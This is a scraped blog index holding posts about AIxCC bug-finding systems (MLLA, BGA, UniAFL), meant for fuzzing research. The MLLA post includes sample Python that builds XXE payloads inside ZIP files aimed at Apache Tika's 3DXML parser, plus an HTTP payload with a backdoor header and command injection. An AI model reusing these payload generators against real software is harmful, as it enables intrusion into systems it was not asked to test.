tailoring information for each agent\u0026rsquo;s specialized needs rather than broadcasting everything Intelligent Filtering eliminates redundant work across agents to avoid wasting computational resources Work Distribution requires understanding each agent\u0026rsquo;s strengths and dispatching appropriate vulnerability contexts Result Aggregation from multiple concurrent agents while maintaining system stability and preventing race conditions Domain Knowledge Integration Rather than overwhelming LLMs with comprehensive security knowledge, we found that adaptive, context-sensitive guidance works better. The system selectively integrates vulnerability patterns and data structure insights based on target-specific analysis, preventing information overload while ensuring relevant knowledge reaches the agents.\nWhen \u0026ldquo;Good Enough\u0026rdquo; Beats Perfect The Generator Agent taught us a counterintuitive lesson about working with non-deterministic systems: sometimes it\u0026rsquo;s better to generate 20 \u0026ldquo;good enough\u0026rdquo; attempts than to spend all your effort trying to craft one perfect solution. This insight applies far beyond exploit generation – it\u0026rsquo;s a fundamental principle for working with any probabilistic AI system.\nFor a deep dive into the context engineering techniques that enable these capabilities, see our post: Context Engineering: How BGA Teaches LLMs to Write Exploits\nSo where does this breakthrough lead us? The implications extend far beyond just finding vulnerabilities.\nFuture Vision: Where BGA Goes Next BGA\u0026rsquo;s success in AIxCC revealed something important: we already have incredible context information available, but we may not be utilizing it effectively.\nThe Context Goldmine We\u0026rsquo;re Sitting On Looking at our current pipeline, we have access to rich information that most LLM systems can only dream of:\nTestlang structure from our harness analysis Dictgen tokens and existing dictionary patterns in the repo Concolic constraints from our symbolic execution tools Call graphs from CPUA providing precise function relationships Bug information (BITs) from BCDA with detailed vulnerability context Plus many other analysis tools feeding structured data The realization hit us: we may not be utilizing these context sources effectively.\nContext Engineering: The Next Frontier Working with LLMs taught us they function much like humans in crucial ways:\nLove top-down descriptions - they need the big picture first Require context information and direct instructions - vague requests fail Core information is important and verbosity matters - too much noise hurts, too little context also hurts This points to a massive opportunity: context engineering. People talk about \u0026ldquo;prompt engineering,\u0026rdquo; but we think the future is \u0026ldquo;context engineering\u0026rdquo; - intelligently structuring and presenting information to maximize LLM effectiveness.\nThe Questions Driving Us Forward Context Optimization: How can we effectively structure all this rich information? Beyond Fuzzing: Can we build a full exploit agent for CTF targets (like XBOW) or real-world vulnerabilities without harnesses? Memory Utilization: Can we tap into LLMs\u0026rsquo; knowledge base like humans recall memories? They already know about Java\u0026rsquo;s ServletFileUpload, repository patterns, and common vulnerability classes Intermediate Representations: Is there an LLM-friendly structure for representing code, bugs, and exploitation context? Context Engineering for Discovery: Can better context engineering enhance not just exploitation but bug discovery itself? The Bigger Picture BGA proved that script-based generation works. Now the question becomes: how far can intelligent context engineering take us? The components are all there - we just need to learn how to orchestrate them more effectively.\nDive Deeper Ready to explore BGA in detail? Here are your next steps:\n📚 Technical Resources Source Code by Agent: Orchestrator Agent BlobGen Agent Generator Agent Mutator Agent 🔗 Related Deep Dives 🧠 Context Engineering: How BGA Teaches LLMs to Write Exploits 📖 UniAFL: The Fuzzing Infrastructure 🏗️ MLLA Overview: The Complete System 🗺️ Deep dive into CPUA, MCGA, CGPA\u0026rsquo;s code understanding and navigation 🔬 BCDA: The AI Detective Separating Real Bugs from False Alarms Self-evolving exploits represent a different approach to AI-assisted security research – one where adaptation and learning drive success rather than hoping for perfect initial generation.\n"},{"section":"Blog","slug":"/blog/post-mlla-overview/","title":"MLLA: Teaching LLMs to Hunt Bugs Like Security Researchers","description":"Overview of Multi-Language LLM Agent (MLLA) - The most LLM-intensive vulnerability discovery system in Atlantis-Multilang","date":"August 28, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/preview_hu_88e4d0bccb21d9cf.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"280\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/preview_hu_2006b2140c9f7286.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/mlla/preview_hu_a0b30be2ff61a1b1.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/mlla\\/preview_hu_ef38c25bc4990a61.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Multilang","tags":"mlla, llm, vulnerability-discovery, multi-agent","content":"When Fuzzing Meets Intelligence Picture this: you\u0026rsquo;re a security researcher staring at 20 million lines of code, hunting for vulnerabilities that could compromise everything from your smartphone to critical infrastructure. Traditional fuzzers approach this challenge with brute force – throwing millions of random inputs at the program like a toddler mashing keyboard keys. Sometimes it works. Often, it doesn\u0026rsquo;t.\nBut what if we could change the game entirely?\nMeet MLLA (Multi-Language LLM Agent) – the most ambitious experiment in AI-assisted vulnerability discovery we\u0026rsquo;ve ever built. Instead of random chaos, MLLA thinks, plans, and hunts bugs like an experienced security researcher, but at machine scale.\nWhy \u0026ldquo;Smart and Fast\u0026rdquo; Beats \u0026ldquo;Dumb and Fast\u0026rdquo; Don\u0026rsquo;t get us wrong – traditional fuzzing has been a phenomenal success story. It\u0026rsquo;s uncovered thousands of critical vulnerabilities across every piece of software you use daily. But here\u0026rsquo;s the thing: traditional fuzzers are essentially very sophisticated random number generators. They don\u0026rsquo;t understand what they\u0026rsquo;re testing.\nA traditional fuzzer doesn\u0026rsquo;t know that ProcessBuilder in Java can execute system commands. It can\u0026rsquo;t recognize that deserializing untrusted data is a security minefield. It just flips bits and hopes something crashes – which is both its greatest strength and its Achilles\u0026rsquo; heel.\nOver the years, researchers have tried to overcome this limitation with structure-aware fuzzing, crafting custom input generators or grammar models that understand formats like JSON, PDF, or TLS handshakes. But here\u0026rsquo;s the problem: building these harnesses is incredibly manual and brittle. Take fuzzing a TLS implementation: you need to painstakingly write a generator that encodes valid handshake messages, and one missing detail means your fuzzer just stalls at the parser. This kind of effort simply doesn\u0026rsquo;t scale.\nThe cracks in this approach become obvious when you face modern software\u0026rsquo;s complexity:\nValidation gauntlets: Modern programs have layers of input validation that random mutations rarely penetrate Format awareness: Try fuzzing a JSON API with random bytes – you\u0026rsquo;ll spend 99% of your time triggering parsing errors instead of logic bugs State dependencies: Some vulnerabilities only appear after precise sequences of operations Multi-language chaos: Real systems blend C, Java, Python, and more in ways that single-language fuzzers can\u0026rsquo;t handle During the AIxCC competition, we hit every one of these walls. Traditional \u0026ldquo;spray and pray\u0026rdquo; fuzzing wasn\u0026rsquo;t going to find the sophisticated bugs hiding in modern codebases.\nThat\u0026rsquo;s when we decided to build something different.\nFrom Chaos to Strategy What if, instead of randomly mutating inputs, we could teach AI to craft attacks like a human security researcher would?\nOur UniAFL system explores this idea across six different input generation modules, each using AI at different intensity levels. At one extreme, you have traditional fuzzers with zero AI involvement. At the other extreme sits MLLA – our \u0026ldquo;what happens if we go all-in on AI?\u0026rdquo; experiment.\nMLLA doesn\u0026rsquo;t just use LLMs as helpers for specific tasks. Instead, it\u0026rsquo;s built around the radical idea that AI should drive the entire vulnerability discovery process, from understanding code to crafting exploits.\nThe AI Dream Team Here\u0026rsquo;s where MLLA gets interesting: instead of building one monolithic AI brain, we created a team of specialist agents. Each one has a specific job, specific skills, and a specific personality. Together, they work like a cybersecurity consulting firm – but one that never sleeps, never gets tired, and can analyze millions of lines of code simultaneously.\n🎯 Meet the Team MLLA\u0026rsquo;s multi-agent architecture orchestrating vulnerability discovery\r📍 CGPA (Call Graph Parser Agent): The Navigator Picture the most organized person you know – the one who never gets lost, always knows exactly where everything is, and can give perfect directions to anywhere. That\u0026rsquo;s CGPA. In a codebase with millions of functions scattered across thousands of files, CGPA keeps everyone oriented. When another agent says \u0026ldquo;I need to analyze the function that processes user input,\u0026rdquo; CGPA instantly knows exactly which function, in which file, with which dependencies.\n🔍 CPUA (CP Understanding Agent): The Scout Every heist movie has that character who cases the joint first – mapping out entrances, exits, and security vulnerabilities. CPUA fills this role for code. It analyzes the \u0026ldquo;harness\u0026rdquo; (the entry point to the program) and identifies the most promising targets. Instead of wandering aimlessly through millions of functions, CPUA says \u0026ldquo;These 50 functions handle untrusted input – start here.\u0026rdquo;\n🗺️ MCGA (Make Call Graph Agent): The Cartographer If CGPA is your GPS, MCGA is the mapmaker who surveys uncharted territory. It traces how functions connect to each other, building detailed relationship maps across the entire codebase. But MCGA doesn\u0026rsquo;t just map roads – it marks the dangerous neighborhoods. When it spots a function that deserializes data or executes system commands, it flags it as a high-value target.\n🎯 BCDA (Bug Candidate Detection Agent): The Detective Not every suspicious activity is actually a crime. BCDA is the seasoned detective who can tell the difference between a false alarm and the real deal. It takes MCGA\u0026rsquo;s marked locations and asks the hard questions: \u0026ldquo;Is this actually exploitable? What conditions need to be met? What would an attack look like?\u0026rdquo; BCDA produces what we call BITs – detailed case files for genuine vulnerabilities.\n💣 BGA (Blob Generation Agent): The Demolition Expert Here\u0026rsquo;s where the magic happens. Instead of just creating attack payloads, BGA writes programs that create attack payloads – like a master criminal who doesn\u0026rsquo;t just plan one heist, but writes the playbook that can be adapted for any target. These Python scripts can generate thousands of variations, each one precisely crafted for the specific vulnerability BCDA identified.\nThe Revolutionary Approach: Programming Attacks Now you might be thinking: \u0026ldquo;Okay, cool agents, but what makes this actually different from existing tools?\u0026rdquo; Here\u0026rsquo;s where MLLA breaks new ground.\nTraditional vulnerability discovery tools face a fundamental trade-off: either go dumb-and-fast (random mutations that usually fail) or try to be smart-but-brittle (hand-crafted exploits that break easily). MLLA found a third way:\ndef create_payload() -\u0026gt; bytes: # BGA generates functions like this that construct exploits payload = b\u0026#34;HTTP/1.1\\r\\n\u0026#34; payload += b\u0026#34;x-evil-backdoor: \u0026#34; + sha256(b\u0026#34;breakin the law\u0026#34;).digest() payload += b\u0026#34;\\r\\nContent-Length: 42\\r\\n\\r\\n\u0026#34; payload += construct_command_injection(\u0026#34;jazzer\u0026#34;) return payload This approach allows MLLA to:\nHandle complex formats (JSON, XML, Protocol Buffers) Incorporate dynamic values (checksums, lengths, timestamps) Document the exploitation logic Iterate and refine based on feedback The Key Integration: These aren\u0026rsquo;t just proof-of-concept scripts. Every blob and script that MLLA generates feeds directly into UniAFL\u0026rsquo;s fuzzing infrastructure, where they become seeds for massive-scale testing campaigns. It\u0026rsquo;s the best of both worlds: human-level strategic thinking combined with machine-scale execution.\nBattle-Tested: The Apache Tika Story Theory is nice, but does this actually work in practice? Let\u0026rsquo;s walk through a real example from the AIxCC Final Round 3.\nThe Target: Apache Tika had just introduced a new 3DXML parser – a feature for processing ZIP-based CAD files containing XML manifests and 3D model data. Fresh code. Complex format. Multiple validation layers. In other words, exactly the kind of target where traditional fuzzing struggles.\nThe Challenge This particular vulnerability required understanding Apache Tika\u0026rsquo;s new 3DXML processing pipeline:\nMulti-layer validation: ZIP structure must be valid before XML parsing begins Format complexity: ZIP files need proper headers, central directories, CRC32 checksums Manifest structure: The ZIP must contain a valid Manifest.xml pointing to a .3dxml root file XML parsing chain: The root file gets parsed by a SAX parser, creating XXE opportunities Vulnerability detection: The exploit must trigger an external entity access that Jazzer\u0026rsquo;s sanitizers can detect Here\u0026rsquo;s the kind of generator MLLA produces:\ndef generate(rnd: random.Random) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Generate XXE payloads embedded in valid ZIP files. This demonstrates MLLA\u0026#39;s approach: not just generating XML, but orchestrating complex multi-format attacks. \u0026#34;\u0026#34;\u0026#34; # Step 1: Choose attack strategy intelligently strategy = rnd.choice([\u0026#39;basic_xxe\u0026#39;, \u0026#39;xinclude\u0026#39;, \u0026#39;schema_ref\u0026#39;, \u0026#39;dtd_external\u0026#39;]) # Step 2: Create valid ZIP container structure root_filename = rnd.choice([\u0026#39;root.xml\u0026#39;, \u0026#39;data.xml\u0026#39;, \u0026#39;content.xml\u0026#39;]) manifest = create_manifest(root_filename) # Step 3: Generate XXE payload based on strategy if strategy == \u0026#39;basic_xxe\u0026#39;: xml_content = create_xxe_entity(rnd) elif strategy == \u0026#39;xinclude\u0026#39;: xml_content = create_xinclude_attack(rnd) # ... other strategies # Step 4: Build complete ZIP file with proper binary structure return create_zip([(\u0026#39;Manifest.xml\u0026#39;, manifest), (root_filename, xml_content)], rnd) def create_xxe_entity(rnd): \u0026#34;\u0026#34;\u0026#34;Generate XXE with external entity targeting jazzer.com\u0026#34;\u0026#34;\u0026#34; port = rnd.choice([80, 443, 8080, 8443]) path = rnd.choice([\u0026#39;\u0026#39;, \u0026#39;/test\u0026#39;, \u0026#39;/data.xml\u0026#39;, \u0026#39;/api/endpoint\u0026#39;]) return f\u0026#39;\u0026#39;\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://jazzer.com:{port}{path}\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt;\u0026amp;xxe;\u0026lt;/root\u0026gt;\u0026#39;\u0026#39;\u0026#39;.encode(\u0026#39;utf-8\u0026#39;) def create_zip(files, rnd): \u0026#34;\u0026#34;\u0026#34;Construct valid ZIP with proper headers, compression, CRC32...\u0026#34;\u0026#34;\u0026#34; # This is where the binary format mastery happens zip_data = bytearray() for filename, content in files: # Choose compression strategy compress_level = rnd.choice([0, 1, 6, 9]) compressed = zlib.compress(content, compress_level) if compress_level else content # Build ZIP headers with proper signatures and metadata header = struct.pack(\u0026#39;\u0026lt;I\u0026#39;, 0x04034b50) # ZIP local file header header += struct.pack(\u0026#39;\u0026lt;H\u0026#39;, 20) # Version needed header += struct.pack(\u0026#39;\u0026lt;H\u0026#39;, 0) # Flags header += struct.pack(\u0026#39;\u0026lt;H\u0026#39;, 8 if compress_level else 0) # Compression method header += struct.pack(\u0026#39;\u0026lt;I\u0026#39;, zlib.crc32(content) \u0026amp; 0xffffffff) # CRC32 # ... complete ZIP specification implementation zip_data.extend(header + filename.encode() + compressed) # Add central directory and end-of-central-directory records zip_data.extend(build_central_directory(files)) return bytes(zip_data) What Makes This Different? Look at what this generator accomplishes in a single function: it\u0026rsquo;s not just creating random XML files or mutating ZIP bytes. It\u0026rsquo;s orchestrating a complete multi-format attack that traditional fuzzing would struggle to achieve.\nFirst, there\u0026rsquo;s the format juggling act. The generator has to be fluent in both ZIP and XML simultaneously. It creates valid ZIP headers with proper CRC32 checksums and compression while embedding perfectly formed XML with complex XXE syntax. Try explaining to a random mutator how to maintain both ZIP structural integrity AND XML semantic correctness while crafting an exploit – it\u0026rsquo;s like asking someone to play chess and poker at the same time.\nSecond, it\u0026rsquo;s thinking strategically, not randomly. Notice how it chooses attack vectors (basic_xxe, xinclude, schema_ref) and varies parameters intelligently – common ports like 443 for higher success probability, but also uncommon ones like 8443 to explore edge cases. It\u0026rsquo;s not uniform randomness; it\u0026rsquo;s informed exploration based on what a security researcher would try.\nThe real breakthrough is that MLLA generates attack strategies, not just attack payloads. Each generator function is essentially a condensed security researcher\u0026rsquo;s playbook, encoded in executable Python that can run thousands of variations.\nTraditional fuzzing would need millions of random mutations to stumble upon:\nA valid ZIP file structure With properly embedded XML That contains working XXE syntax Targeting the exact domain that triggers detection MLLA does all of this systematically in a single generator that adapts its approach based on what it learns about the target. This strategic approach proved itself in competition – contributing 7 unique vulnerabilities that required exactly this kind of format-aware, intelligent exploration to discover.\nThe Tactical Advantage: Two-Mode Operation But MLLA isn\u0026rsquo;t just one monolithic system. It\u0026rsquo;s designed with tactical flexibility – operating in two complementary modes depending on the situation:\n🚀 Standalone Mode: Fast and Broad When you need to quickly explore a new codebase, MLLA\u0026rsquo;s standalone mode kicks into action. It:\nAnalyzes only the harness file (no deep call graph analysis) Generates diverse seeds using the same script-based approach Operates with minimal setup and resource requirements Provides rapid coverage of the vulnerability search space Think of it as MLLA\u0026rsquo;s reconnaissance mode – quickly surveying the terrain and generating interesting inputs to get fuzzing started.\n🔬 Full Pipeline Mode: Deep and Targeted When standalone mode or other fuzzing modules discover interesting crash sites or code paths, the full MLLA pipeline engages:\nAll five agents (CGPA, CPUA, MCGA, BCDA, BGA) work in concert Builds comprehensive call graphs and identifies precise vulnerability paths Generates highly targeted exploits for specific bug candidates Employs sophisticated static analysis and LLM reasoning This is MLLA\u0026rsquo;s surgical mode – taking interesting leads and turning them into concrete, exploitable vulnerabilities.\n🎯 The Power of Adaptability This dual-mode design captures a crucial insight: the best AI-assisted security tools aren\u0026rsquo;t about replacing human approaches, but about intelligently amplifying them at exactly the right moments.\nSometimes you need broad exploration (standalone mode). Sometimes you need surgical precision (full pipeline). MLLA supports both modes, allowing users to choose the approach that best fits their current needs.\nThe Orchestration: When All Agents Unite Here\u0026rsquo;s how the magic actually happens when the full pipeline mode is activated. Picture a cybersecurity war room where our five AI agents collaborate:\nCPUA surveys the target, identifying the most promising entry points. MCGA maps out how these entry points connect to potentially dangerous code, while CGPA ensures everyone stays oriented in the complexity. BCDA analyzes these connections to confirm genuine vulnerabilities, and BGA then crafts targeted exploits for the identified issues.\nIn this orchestrated process, agents work in coordination, sharing information and building upon each other\u0026rsquo;s findings to systematically identify and exploit vulnerabilities.\nThe Results: 7 Vulnerabilities That Mattered When the competition ended, we couldn\u0026rsquo;t measure MLLA\u0026rsquo;s exact contribution. We\u0026rsquo;d intentionally turned off logging early on to save storage and computing costs, which meant we couldn\u0026rsquo;t get the exact final evaluation results for each module. However, by utilizing the OpenTelemetry logs from the organizers, we confirmed that MLLA contributed to finding at least 7 unique vulnerabilities.\nThese weren\u0026rsquo;t random crashes. They were sophisticated bugs hiding behind validation layers, buried in complex file format parsers, and dependent on precise semantic relationships between code components. Exactly the kind of strategic, format-aware vulnerabilities that traditional fuzzing struggles to find.\nBut here\u0026rsquo;s what really matters: in our extensive internal testing before submission, MLLA consistently demonstrated value beyond just finding bugs. It often reached complex vulnerabilities that no other module could touch. And even when MLLA didn\u0026rsquo;t directly trigger the final crash (that honor went to its BGA component), its intermediate outputs like bug hypotheses, branch conditions, and semantic traces significantly enriched UniAFL\u0026rsquo;s seed pool and results. MLLA acted not just as a bug finder, but as a catalyst that amplified the effectiveness of the entire system.\nThe Engineering Reality Check Building MLLA wasn\u0026rsquo;t just about having a cool idea – it meant solving some genuinely hard engineering problems:\nCost Control: Five AI agents making thousands of LLM calls can bankrupt you fast. We had to get creative with prompt optimization and aggressive caching.\nSpeed vs. Intelligence: LLMs are slow compared to traditional fuzzing. Our solution? Massive parallelization and asynchronous execution so agents can work simultaneously.\nFighting Hallucinations: More LLM usage means more opportunities for AI to confidently tell you complete nonsense. We built validation layers and cross-checking systems to keep agents honest.\nContext Juggling: Complex vulnerabilities need lots of context, but LLMs have limits. We developed compression techniques to fit elephant-sized problems into mouse-sized context windows.\nWhat\u0026rsquo;s Coming Next MLLA proves that AI-assisted vulnerability discovery isn\u0026rsquo;t science fiction – it\u0026rsquo;s here, it works, and it finds bugs that traditional approaches miss. But this is just the beginning.\nWe\u0026rsquo;re already envisioning the next generation: agents that learn from every vulnerability they find, AI systems that collaborate with human researchers in real-time, and tools that don\u0026rsquo;t just find bugs but automatically generate patches. The future of cybersecurity isn\u0026rsquo;t just about being faster – it\u0026rsquo;s about being fundamentally smarter.\nDive Deeper This overview just scratches the surface. In our upcoming deep-dive posts, we\u0026rsquo;ll pull back the curtain on each component:\n🗺️ Code Understanding \u0026 Navigation: How CPUA, MCGA, and CGPA work together to map and analyze massive codebases 🔬 The Detective Work: BCDA's techniques for distinguishing real vulnerabilities from false positives 🛠️ The Exploit Factory: BGA's three-agent framework (BlobGen, Generator, Mutator) and why script-based generation outperforms direct payload creation 🧠 Context Engineering: How MLLA prompts LLMs effectively and manages context windows for vulnerability discovery Ready to explore?\n🌐 Browse the complete MLLA source code 📖 Learn about UniAFL, MLLA\u0026rsquo;s parent system 🛠️ Deep dive into BGA\u0026rsquo;s self-evolving exploits 🧠 Context Engineering: How BGA teaches LLMs to write exploits 🗺️ Deep dive into CPUA, MCGA, CGPA\u0026rsquo;s code understanding and navigation 🔬 BCDA - The AI Detective Separating Real Bugs from False Alarms The age of intelligent vulnerability discovery has arrived. MLLA proves that when you combine human-level strategic thinking with machine-scale execution, you don\u0026rsquo;t just find more bugs – you find the right bugs. The ones that matter. The ones that traditional approaches miss.\n"},{"section":"Blog","slug":"/blog/post-crs-multilang/","title":"Atlantis-Multilang (UniAFL): LLM-powered &amp; Lauguage-agonistic Automatic Bug Finding","description":"Overview of Atlantis-Multilang","date":"August 20, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-multilang/multilang_hu_f2c6fddb51a010ff.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"280\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-multilang\\/multilang_hu_bce4084b6cb4879a.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-multilang/multilang_hu_ad57e85fee90751b.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-multilang\\/multilang_hu_4703b05081cafef9.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Multilang","tags":"multilang","content":"Atlantis-Multilang == UniAFL Atlantis-Multilang is a fuzzing framework called UniAFL, designed to LLMs for fuzzing across multiple programming languages. Unlike Atlantis-C and Atlantis-Java, it avoids language-specific instrumentation and is intentionally built to be as language-agnostic as possible — both in design and execution. Despite this broad and general approach, UniAFL proved to be highly effective in the AIxCC finals, contributing to 69.2% of all POV (Proof-of-Vulnerability) submissions. This result highlights not only the flexibility of its design but also its strong performance in practice. In this post, we’ll walk you through how we pulled it off, why we made these design choices, and what made UniAFL so effective in practice.\nDesign of UniAFL 🎯 Language-Agnostic Fuzzing Challenge Programs in AIxCC were provided in the OSS-Fuzz project format, which supports a variety of programming languages such as C, C++, and Java. Traditional fuzzers, however, often lock themselves into specific languages—or even specific compiler versions—making them less flexible. With UniAFL, we set out to support fuzzing across any OSS-Fuzz–compatible language. While the competition only included C and Java, our design is extensible to Python, Rust, Go, and beyond. No matter the language, the fuzzer should be able to plug in and run. 🤖 Boosting Fuzzing Performance with LLMs A long-standing bottleneck in fuzzing is how effectively inputs are generated and mutated. Existing approaches often improve incrementally, but they struggle with complex targets that demand highly structured inputs. UniAFL leverages LLMs to enhance this process. Instead of relying solely on random mutations, LLMs can infer and generate semantically valid, yet edge-case-driven inputs. This dramatically increases the chances of triggering vulnerabilities. Due to restrictions on LLM usage during AIxCC, we designed UniAFL in a modular way, allowing for multiple levels of LLM involvement—ranging from minimal use to full integration, depending on available resources and rules. Not only for the competition, but also in real-world use, this allows us to pick certain LLM-powered modules depending on the LLM budget. ⚡ Optimizing the Fuzzing Pipeline and Development Workflow Fuzzing shines when run in parallel across many cores, but this also introduces synchronization overhead between fuzzing processes. UniAFL includes optimizations to minimize cross-process overhead, ensuring smooth performance at scale. In addition, supporting multi-language CPs demanded a flexible architecture. We modularized UniAFL so that language-specific components can be added, swapped, or updated with minimal friction. This not only accelerates development but also makes the system easier to maintain and extend. Overview of UniAFL As shown in the above overview figure, ATLANTIS-Multilang consists of two main components: UniAFL and FuzzDB. UniAFL is the engine that drives fuzzing according to the three design goals we described earlier, while FuzzDB acts as the storage layer, keeping track of everything UniAFL produces \u0026ndash; seeds, POVs, coverage data, and bug candidates. Notably, In the figure, the green boxes represent the LLM-powered modules, highlighting the parts of the system where LLM plays a role in enhancing fuzzing effectiveness.\nAt a high level, UniAFL works much like a traditional fuzzer, but with some unique twists:\nCorpus Manager picks a seed input to start fuzzing, especially directed fuzzing toward bug candidates, which are intermediate results of LLM-powered modules in UniAFL. Input Generators then create new inputs either by mutating the seed or generating fresh inputs from scratch. Some of these input generators go a step further: instead of directly producing inputs, they generate Python scripts that generate or mutate inputs, giving us more flexibility in creating structured test cases. Script Executor runs those Python scripts, turning them into actual inputs. Input Executor feeds those inputs into the target harness and collects execution results along with coverage data. Coverage Symbolizer converts raw edge coverage into line coverage — a crucial step, since the LLM-powered modules rely on line-level feedback because LLM cannot understand basic block addresses in raw coverage data. Finally, based on execution results and coverage data, Corpus Manager updates the corpus and schedulers to guide directed fuzzing. This procedure repeats continuously until the fuzzing session ends to explore deeper paths and uncover vulnerabilities.\nInside UniAFL: Six Input Generation Modules At the heart of UniAFL are its six input generation modules, each designed with a different level of reliance on LLMs. This modular design lets the system balance between traditional fuzzing techniques and AI-powered enhancements.\nNo LLMs Given Fuzzer: the simplest module, running the target harness directly using libFuzzer (for C) and Jazzer (for Java) Hybrid Fuzzer: combines fuzzing with concolic execution to explore deeper paths. While the core workflow does not use LLMs, we employed LLMs during development to assist in symbolic function modeling for the concolic executor. Limited LLM Usage Dictionary-Based: uses an LLM to infer dictionaries for a given function, then applies dictionary-based mutations at the function level. TestLang-Based: asks the LLM to analyze the target’s input format, express it in TestLang (a specialized input description language), and then generate or mutate inputs accordingly. MLLA-Standalone: employs an LLM to write Python scripts that, in turn, generate new inputs. Full LLM Power MLLA: the most LLM-intensive module. It leverages AI to construct tainted call graphs, identify promising bug candidates, and generate targeted inputs or Python scripts that produce mutations specifically aimed at those candidates. By combining these six modules, UniAFL can flexibly scale its fuzzing strategy from lightweight, language-agnostic fuzzing to deeply AI-driven, bug-targeted exploration. Here are the overall results showing how each input generator contributed in the AIxCC finals and our internal rounds:\n+--------------------+--------------------------+------------------------------------+ | Input Generator | Unique POV (AIxCC Final) | Seed Contribution (Internal Round) | +--------------------+--------------------------+------------------------------------+ | Given Fuzzer | 48 | 69.9% | | Hybrid Fuzzer | 2 | 0.2% | | Dictionary-based | 0 | 4.8% | | Testlang-based | 8 | 42.7% (Separate Seed Pool) | | MLLA (+Standalone) | 7 | 2.2% | | Given Seeds, etc | 9 | 22.9% | +--------------------+--------------------------+------------------------------------+ Looking at the overall results from both the AIxCC finals and our internal rounds, we observed how each input generator contributed. The Given Fuzzer served as the baseline, but on its own it struggled to discover more interesting seeds or POVs. The real breakthroughs came when the other input generators kicked in. They consistently provided meaningful new inputs that helped UniAFL break out of plateaus whenever the given fuzzer got stuck. What\u0026rsquo;s Next? 🚀 See upcoming individual posts diving deeper into each input generator and the UniAFL infrastructure! 🌐 Check UniAFL Source Code! 🧠 Explore MLLA: The Multi-Language LLM Agent System "},{"section":"Blog","slug":"/blog/post-crs-java-directed-jazzer/","title":"Sinkpoint-focused Directed Fuzzing","description":"Guiding Jazzer towards critical code locations","date":"August 19, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/directed/featured_hu_f390902fbc214e99.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"280\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/directed\\/featured_hu_7841ad9fd258e39a.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/directed/featured_hu_f41b42b3f47c88c8.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/directed\\/featured_hu_dc5659ed1fc9f825.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Java","tags":"directed fuzzing, 